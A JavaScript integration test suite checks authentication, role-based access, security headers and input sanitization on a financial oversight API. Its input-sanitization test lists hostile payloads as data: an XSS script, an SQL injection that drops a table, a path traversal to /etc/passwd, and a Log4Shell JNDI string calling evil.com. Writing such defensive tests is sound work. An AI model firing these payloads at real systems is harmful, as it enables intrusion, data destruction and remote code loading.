/**
 * Authentication API Integration Tests
 * Tests authentication, authorization, role-based access control,
 * and permission validation across all financial oversight endpoints
 */

const axios = require('axios');

class AuthenticationApiTest {
  constructor(baseURL, auth) {
    this.baseURL = baseURL;
    this.auth = auth;
    this.testResults = {
      passed: 0,
      failed: 0,
      errors: []
    };
  }

  async runTest(testName, testFunction) {
    try {
      console.log(`🧪 Testing: ${testName}`);
      await testFunction();
      console.log(`   ✅ PASSED: ${testName}`);
      this.testResults.passed++;
    } catch (error) {
      console.log(`   ❌ FAILED: ${testName} - ${error.message}`);
      this.testResults.failed++;
      this.testResults.errors.push({ test: testName, error: error.message });
    }
  }

  async testHealthEndpointNoAuth() {
    // Health endpoint should be accessible without authentication
    const response = await axios.get(`${this.baseURL}/health`);

    if (response.status !== 200) {
      throw new Error(`Expected status 200, got ${response.status}`);
    }

    if (!response.data.status || response.data.status !== 'OK') {
      throw new Error('Health endpoint not returning OK status');
    }
  }

  async testProtectedEndpointWithoutAuth() {
    // Protected endpoints should require authentication
    const protectedEndpoints = [
      '/two-tier-approval/financial-review/applications',
      '/financial-dashboard/metrics',
      '/financial-transactions/query'
    ];

    for (const endpoint of protectedEndpoints) {
      try {
        await axios.get(`${this.baseURL}${endpoint}`);
        throw new Error(`Endpoint ${endpoint} should require authentication but allowed access`);
      } catch (error) {
        if (error.response && error.response.status === 401) {
          // Expected authentication error
          continue;
        }
        throw new Error(`Endpoint ${endpoint} returned unexpected error: ${error.message}`);
      }
    }
  }

  async testValidAuthenticationToken() {
    // Test that valid authentication token allows access
    const response = await axios.get(
      `${this.baseURL}/two-tier-approval/statistics`,
      { headers: this.auth.headers }
    );

    if (response.status !== 200) {
      throw new Error(`Expected status 200 with valid auth, got ${response.status}`);
    }

    if (!response.data.success) {
      throw new Error('Response success flag is false with valid authentication');
    }
  }

  async testInvalidAuthenticationToken() {
    // Test that invalid authentication token is rejected
    const invalidHeaders = {
      'Authorization': 'Bearer invalid_token_12345',
      'Content-Type': 'application/json'
    };

    try {
      await axios.get(
        `${this.baseURL}/two-tier-approval/statistics`,
        { headers: invalidHeaders }
      );
      throw new Error('Invalid authentication token should be rejected but was accepted');
    } catch (error) {
      if (error.response && error.response.status === 401) {
        // Expected authentication error
        return;
      }
      throw error;
    }
  }

  async testMalformedAuthenticationHeader() {
    // Test malformed Authorization header
    const malformedHeaders = [
      { 'Authorization': 'InvalidFormat token123' },
      { 'Authorization': 'Bearer' }, // Missing token
      { 'Authorization': '' }, // Empty header
    ];

    for (const headers of malformedHeaders) {
      try {
        await axios.get(
          `${this.baseURL}/two-tier-approval/statistics`,
          { headers: { ...headers, 'Content-Type': 'application/json' } }
        );
        throw new Error(`Malformed auth header should be rejected: ${JSON.stringify(headers)}`);
      } catch (error) {
        if (error.response && error.response.status === 401) {
          // Expected authentication error
          continue;
        }
        throw error;
      }
    }
  }

  async testRoleBasedAccessControl() {
    // Test that financial reviewer role can access financial endpoints
    const financialEndpoints = [
      '/two-tier-approval/financial-review/applications',
      '/two-tier-approval/financial/summary',
      '/financial-dashboard/metrics'
    ];

    for (const endpoint of financialEndpoints) {
      const response = await axios.get(
        `${this.baseURL}${endpoint}`,
        { headers: this.auth.headers }
      );

      if (response.status !== 200) {
        throw new Error(`Financial reviewer should have access to ${endpoint}, got status ${response.status}`);
      }
    }
  }

  async testPermissionBasedAccess() {
    // Test specific permission requirements
    const permissionEndpoints = [
      {
        endpoint: '/two-tier-approval/financial/transactions',
        requiredPermission: 'financial.view_all_transactions'
      },
      {
        endpoint: '/financial-dashboard/metrics',
        requiredPermission: 'financial.view_dashboard'
      },
      {
        endpoint: '/two-tier-approval/financial/summary',
        requiredPermission: 'financial.view_summary'
      }
    ];

    for (const { endpoint, requiredPermission } of permissionEndpoints) {
      const response = await axios.get(
        `${this.baseURL}${endpoint}`,
        { headers: this.auth.headers }
      );

      if (response.status !== 200) {
        throw new Error(`User should have ${requiredPermission} permission for ${endpoint}, got status ${response.status}`);
      }
    }
  }

  async testCORSHeaders() {
    // Test CORS headers are present for cross-origin requests
    const response = await axios.get(
      `${this.baseURL}/health`,
      {
        headers: {
          'Origin': 'http://localhost:3000'
        }
      }
    );

    if (response.status !== 200) {
      throw new Error(`Expected status 200, got ${response.status}`);
    }

    // Check for CORS headers (optional, depends on server configuration)
    if (response.headers['access-control-allow-origin']) {
      console.log('   ✅ CORS headers present for cross-origin support');
    } else {
      console.log('   ⚠️  CORS headers not found (may be configured at proxy level)');
    }
  }

  async testRateLimitingHeaders() {
    // Test for rate limiting headers
    const response = await axios.get(
      `${this.baseURL}/two-tier-approval/statistics`,
      { headers: this.auth.headers }
    );

    if (response.status !== 200) {
      throw new Error(`Expected status 200, got ${response.status}`);
    }

    // Check for rate limiting headers (optional)
    const rateLimitHeaders = ['x-ratelimit-limit', 'x-ratelimit-remaining', 'x-ratelimit-reset'];
    const hasRateLimitHeaders = rateLimitHeaders.some(header => response.headers[header]);

    if (hasRateLimitHeaders) {
      console.log('   ✅ Rate limiting headers present');
    } else {
      console.log('   ⚠️  Rate limiting headers not found (may not be implemented)');
    }
  }

  async testSecurityHeaders() {
    // Test for security headers
    const response = await axios.get(
      `${this.baseURL}/health`
    );

    if (response.status !== 200) {
      throw new Error(`Expected status 200, got ${response.status}`);
    }

    // Check for common security headers
    const securityHeaders = {
      'x-content-type-options': 'nosniff',
      'x-frame-options': 'DENY',
      'x-xss-protection': '1; mode=block'
    };

    let securityHeadersPresent = 0;
    for (const [header, expectedValue] of Object.entries(securityHeaders)) {
      if (response.headers[header]) {
        securityHeadersPresent++;
        console.log(`   ✅ Security header present: ${header}`);
      }
    }

    if (securityHeadersPresent === 0) {
      console.log('   ⚠️  No security headers found (may be configured at proxy level)');
    }
  }

  async testSessionTimeout() {
    // Test session timeout behavior (if implemented)
    // This is a placeholder test as session timeout is typically handled client-side
    console.log('   ⚠️  Session timeout testing requires time-based implementation');
  }

  async testConcurrentRequests() {
    // Test that multiple concurrent requests with same auth token work
    const requests = [];
    for (let i = 0; i < 5; i++) {
      requests.push(
        axios.get(
          `${this.baseURL}/two-tier-approval/statistics`,
          { headers: this.auth.headers }
        )
      );
    }

    const responses = await Promise.all(requests);

    for (const response of responses) {
      if (response.status !== 200) {
        throw new Error(`Concurrent request failed with status ${response.status}`);
      }
    }

    console.log('   ✅ All 5 concurrent requests succeeded');
  }

  async testInputSanitization() {
    // Test that potentially malicious input is sanitized
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '"; DROP TABLE users; --',
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/a}'
    ];

    for (const input of maliciousInputs) {
      try {
        await axios.get(
          `${this.baseURL}/financial-transactions/query?member_search=${encodeURIComponent(input)}`,
          { headers: this.auth.headers }
        );
        // Request should succeed but input should be sanitized
        console.log('   ✅ Malicious input handled without error');
      } catch (error) {
        if (error.response && error.response.status === 400) {
          // Input validation error is acceptable
          console.log('   ✅ Malicious input rejected by validation');
        } else {
          throw error;
        }
      }
    }
  }

  async testHTTPSRedirection() {
    // Test HTTPS redirection (if configured)
    // This test is informational as it depends on server configuration
    console.log('   ⚠️  HTTPS redirection testing requires server configuration');
  }

  async testAuthenticationErrorMessages() {
    // Test that authentication error messages don't leak sensitive information
    try {
      await axios.get(`${this.baseURL}/two-tier-approval/statistics`);
      throw new Error('Expected authentication error');
    } catch (error) {
      if (error.response && error.response.status === 401) {
        const errorMessage = error.response.data.message || error.response.data.error || '';
        
        // Check that error message doesn't contain sensitive information
        const sensitiveTerms = ['database', 'sql', 'internal', 'stack trace', 'file path'];
        const containsSensitiveInfo = sensitiveTerms.some(term => 
          errorMessage.toLowerCase().includes(term)
        );

        if (containsSensitiveInfo) {
          throw new Error(`Authentication error message may contain sensitive information: ${errorMessage}`);
        }

        console.log('   ✅ Authentication error message is appropriately generic');
        return;
      }
      throw error;
    }
  }

  async runAllTests() {
    console.log('🧪 **AUTHENTICATION API INTEGRATION TESTS**\n');

    try {
      await this.runTest('Health Endpoint No Auth', () => this.testHealthEndpointNoAuth());
      await this.runTest('Protected Endpoint Without Auth', () => this.testProtectedEndpointWithoutAuth());
      await this.runTest('Valid Authentication Token', () => this.testValidAuthenticationToken());
      await this.runTest('Invalid Authentication Token', () => this.testInvalidAuthenticationToken());
      await this.runTest('Malformed Authentication Header', () => this.testMalformedAuthenticationHeader());
      await this.runTest('Role-Based Access Control', () => this.testRoleBasedAccessControl());
      await this.runTest('Permission-Based Access', () => this.testPermissionBasedAccess());
      await this.runTest('CORS Headers', () => this.testCORSHeaders());
      await this.runTest('Rate Limiting Headers', () => this.testRateLimitingHeaders());
      await this.runTest('Security Headers', () => this.testSecurityHeaders());
      await this.runTest('Session Timeout', () => this.testSessionTimeout());
      await this.runTest('Concurrent Requests', () => this.testConcurrentRequests());
      await this.runTest('Input Sanitization', () => this.testInputSanitization());
      await this.runTest('HTTPS Redirection', () => this.testHTTPSRedirection());
      await this.runTest('Authentication Error Messages', () => this.testAuthenticationErrorMessages());

      console.log('\n📊 **TEST RESULTS:**');
      console.log(`   ✅ Passed: ${this.testResults.passed}`);
      console.log(`   ❌ Failed: ${this.testResults.failed}`);

      if (this.testResults.failed > 0) {
        console.log('\n❌ **FAILED TESTS:**');
        this.testResults.errors.forEach(error => {
          console.log(`   • ${error.test}: ${error.error}`);
        });
      } else {
        console.log('\n🎉 **ALL TESTS PASSED!**');
        console.log('✅ Authentication API is working correctly');
      }

    } catch (error) {
      console.error('❌ Test execution failed:', error);
      this.testResults.failed++;
      this.testResults.errors.push({ test: 'Test Execution', error: error.message });
    }

    return this.testResults.failed === 0;
  }
}

module.exports = AuthenticationApiTest;
